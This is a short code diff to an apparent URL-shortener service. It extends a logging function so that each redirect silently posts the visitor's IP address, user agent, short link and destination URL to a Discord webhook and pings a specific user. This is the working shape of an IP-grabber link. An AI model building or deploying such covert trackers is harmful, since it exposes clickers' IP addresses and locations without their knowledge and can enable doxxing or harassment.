@@ -46,12 +46,14 @@ def save_data(data):
 def generate_short_url():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=6))
 
-# Function to log IP and user agent to Discord
-def log_to_discord(ip, user_agent):
+# Function to log IP, user agent, and URL to Discord
+def log_to_discord(ip, user_agent, short_path, original_url):
     if user_agent in IGNORED_USER_AGENTS:
         return  # Do not send webhook for ignored user agents
+    # Remove 'https://' or 'http://' from the original URL
+    original_url_no_https = original_url.replace('https://', '').replace('http://', '')
     data = {
-        "content": f"IP: {ip}\nUser-Agent: {user_agent}"
+        "content": f"<@938005604230918204> IP: {ip}\nUser-Agent: {user_agent}\nShort URL: {request.host_url}{short_path}\nOriginal URL: {original_url_no_https}"
     }
     response = requests.post(DISCORD_WEBHOOK_URL, json=data)
     if response.status_code != 204:
@@ -110,7 +112,7 @@ def redirect_url(short_path):
         original_url = data['urls'][short_path]
         ip = request.remote_addr
         user_agent = request.headers.get('User-Agent')
-        log_to_discord(ip, user_agent)
+        log_to_discord(ip, user_agent, short_path, original_url)
         return redirect(original_url)
     return "URL not found", 404
 
